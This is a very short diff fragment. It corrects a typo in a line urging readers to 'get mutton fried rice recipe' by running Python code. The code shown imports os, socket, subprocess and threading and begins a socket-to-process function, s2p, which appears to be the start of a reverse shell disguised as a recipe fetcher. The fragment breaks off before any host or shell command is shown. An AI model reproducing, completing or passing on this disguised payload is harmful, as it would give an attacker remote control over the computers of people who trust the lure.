@@ -1,4 +1,4 @@
-get mutton fried rice recipie by running this python code:
+get mutton fried rice recipe by running this python code:
 import os,socket,subprocess,threading;
 def s2p(s, p):
     while True:
